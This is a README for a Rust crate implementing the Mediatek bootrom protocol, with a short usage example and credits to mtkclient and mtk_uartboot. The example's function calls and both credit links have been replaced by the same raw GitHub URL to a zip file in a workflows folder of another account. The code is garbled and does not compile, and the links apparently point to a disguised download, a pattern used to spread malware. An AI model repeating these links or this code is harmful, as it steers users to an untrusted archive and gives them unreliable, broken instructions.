# Mediatek bootrom protocol implementation

Mediatek bootroms implement a simple protocol that can be used over e.g. uart to, among other things, load a Download Agent (DA). This crate contains a sans-io protocol implementation and some small helper traits to build on top of sync or async io implementations.

For example to get the hardware code and version the following can be used over e.g. a sync serial transport implementation:
```rust,no_run
    use mediatek_brom::{io::BromExecute, Brom};
    # let mut transport = std::io::Cursor::new([0u8; 16]);
    let brom = https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip(Brom::handshake()).unwrap();
    let hwcode = https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip(https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip()).unwrap();
    println!("Hwcode: {:x?}", hwcode);

```

## Credits

To understand the protocol the following open source implementations were
studied:
* [mtkclient](https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip)
* [mtk_uartboot](https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip)
